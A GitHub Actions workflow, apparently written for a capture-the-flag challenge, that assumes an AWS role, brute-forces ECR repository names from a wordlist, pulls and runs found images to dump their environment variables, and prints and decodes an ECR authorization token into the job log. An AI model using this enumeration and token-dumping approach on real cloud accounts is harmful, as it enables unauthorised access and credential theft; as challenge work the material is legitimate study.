name: Try Specific ECR Repositories
on: [push]

jobs:
  assume-role:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: us-east-1
          
      - name: Try Common ECR Repository Names
        run: |
          # Common CTF/Challenge repository names
          REPOS=(
            "imaginary-challenge"
            "challenge"
            "ctf"
            "flag"
            "secret"
            "app"
            "web"
            "api"
            "backend"
            "frontend"
            "database"
            "imaginary"
            "2025-imagine"
            "team1"
            "empasoft"
          )
          
          for repo in "${REPOS[@]}"; do
            echo "=== Trying repository: $repo ==="
            # Try to list images in the repository
            aws ecr list-images --repository-name $repo --max-results 1 2>/dev/null && echo "✅ FOUND: $repo" || echo "❌ Not found: $repo"
          done

      - name: If Found, Pull and Explore Images
        run: |
          # If any repository worked above, pull its images
          # Try the most likely names
          for repo in imaginary-challenge challenge ctf flag; do
            echo "Attempting to pull from $repo"
            # Get available image tags
            TAGS=$(aws ecr list-images --repository-name $repo --query 'imageIds[].imageTag' --output text 2>/dev/null)
            if [ ! -z "$TAGS" ]; then
              echo "Found tags in $repo: $TAGS"
              for tag in $TAGS; do
                echo "Pulling $repo:$tag"
                docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$tag
                echo "=== Inspecting $repo:$tag ==="
                docker images | grep $repo
                # Try to run the image and explore
                docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$tag env || echo "Cannot run, trying other methods"
              done
            fi
          done

      - name: Decode and Use ECR Auth Token
        run: |
          # The auth token from previous runs is base64 encoded
          # Let's decode it and see what's inside
          echo "=== ECR Authorization Token ==="
          AUTH_TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken')
          echo "Token: $AUTH_TOKEN"
          
          # Decode the base64 token
          echo "$AUTH_TOKEN" | base64 -d
          echo
